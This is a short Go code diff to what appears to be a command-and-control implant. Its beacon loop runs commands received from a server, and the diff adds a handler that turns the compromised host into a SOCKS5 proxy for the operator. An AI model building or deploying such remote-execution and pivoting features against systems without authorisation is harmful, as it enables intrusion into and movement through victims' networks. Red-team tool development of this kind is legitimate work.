@@ -21,6 +21,7 @@ var (
 	RootCert          string
 	LoggingEnabled    string
 	cache             string
+	activeProxy       *client_utils.ProxyServer
 )
 
 func main() {
@@ -163,9 +164,18 @@ func handleCommandRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.D
 		}
 		if response.Type == types.CommandResponseType {
 			if commandResponse, ok := response.Payload.(types.CommandResponse); ok {
-				commandResult := executeAndReportCommand(beacon, encoder, commandResponse)
-				if commandResult.CommandResult == "2" {
-					goto Exit
+				logger.Logf(logger.Debug, "commandType: %v", commandResponse.CommandType)
+				if commandResponse.CommandType == "socks" {
+					err := client_utils.HandleSocksCommand(beacon, encoder, commandResponse, &activeProxy)
+					if err != nil {
+						logger.Logf(logger.Error, "Error handling SOCKS5 command: %v", err)
+						return err
+					}
+				} else {
+					commandResult := executeAndReportCommand(beacon, encoder, commandResponse)
+					if commandResult.CommandResult == "2" {
+						goto Exit
+					}
 				}
 			} else {
 				return fmt.Errorf("unexpected payload type for CommandResponse")
